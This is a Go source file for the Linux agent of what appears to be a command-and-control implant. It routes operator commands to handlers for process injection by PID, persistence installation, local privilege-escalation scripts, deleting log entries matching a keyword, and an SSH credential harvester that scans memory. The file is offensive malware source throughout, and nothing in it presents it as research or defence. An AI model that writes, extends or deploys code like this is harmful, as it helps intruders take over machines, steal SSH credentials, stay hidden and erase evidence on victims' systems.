//go:build linux
// +build linux

package agent

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/spf13/cobra"
)

// runInjectLinux implements: !inject --method <method> --pid <pid> --checksum <checksum>
func runInjectLinux(cmd *cobra.Command, args []string) {
	method, _ := cmd.Flags().GetString("method")
	pid, _ := cmd.Flags().GetString("pid")
	checksum, _ := cmd.Flags().GetString("checksum")
	if method == "" || pid == "" || checksum == "" {
		C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	pidInt, err := strconv.ParseInt(pid, 10, 32)
	if err != nil {
		log.Println("Invalid pid")
		C2RespPrintf(cmd, "%s", "Error: invalid pid")
		return
	}
	err = InjectorHandler(int(pidInt), method, checksum)
	if err != nil {
		C2RespPrintf(cmd, "%s", "Error: "+err.Error())
		return
	}
	C2RespPrintf(cmd, "%s", method+": success")
}

// runPersistenceLinux implements: !persistence --method <method>
func runPersistenceLinux(cmd *cobra.Command, _ []string) {
	method, _ := cmd.Flags().GetString("method")
	if method == "" {
		C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	if method == "all" {
		err := PersistAllInOne()
		if err != nil {
			log.Println(err)
			C2RespPrintf(cmd, "%s", "Some has failed: "+err.Error())
		} else {
			C2RespPrintf(cmd, "%s", "Success")
		}
		return
	} else {
		if persistMethod, exists := PersistMethods[method]; exists {
			err := persistMethod()
			if err != nil {
				log.Println(err)
				C2RespPrintf(cmd, "%s", "Error: "+err.Error())
			} else {
				C2RespPrintf(cmd, "%s", "Success")
			}
		} else {
			C2RespPrintf(cmd, "%s", "Error: No such method available")
		}
	}
}

// runGetRootLinux implements: !get_root
func runGetRootLinux(cmd *cobra.Command, args []string) {
	if os.Geteuid() == 0 {
		C2RespPrintf(cmd, "%s", "Warning: You already have root!")
	} else {
		C2RespPrintf(cmd, "%s", "Deprecated")
	}
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	err := CleanAllByKeyword(keyword)
	if err != nil {
		C2RespPrintf(cmd, "%s", err.Error())
		return
	}
	C2RespPrintf(cmd, "%s", "Done")
}

// runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
func runLPELinux(cmd *cobra.Command, args []string) {
	scriptName, _ := cmd.Flags().GetString("script_name")
	checksum, _ := cmd.Flags().GetString("checksum")
	if scriptName == "" || checksum == "" {
		C2RespPrintf(cmd, "%s", "Error: args error")
		return
	}
	out := runLPEHelper(scriptName, checksum)
	C2RespPrintf(cmd, "%s", out)
}

// runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
	codePattern, _ := cmd.Flags().GetString("code_pattern")
	regName, _ := cmd.Flags().GetString("reg_name")
	stop, _ := cmd.Flags().GetBool("stop")
	if stop && SshHarvesterCancel != nil {
		SshHarvesterCancel()
		C2RespPrintf(cmd, "%s", "SSH harvester stopped")
		return
	}
	codePatternBytes, err := hex.DecodeString(codePattern)
	if err != nil {
		C2RespPrintf(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
		return
	}
	if sshHarvesterRunning {
		C2RespPrintf(cmd, "%s", "SSH harvester is already running")
	} else {
		go ssh_harvester(cmd, codePatternBytes, regName)
	}
}
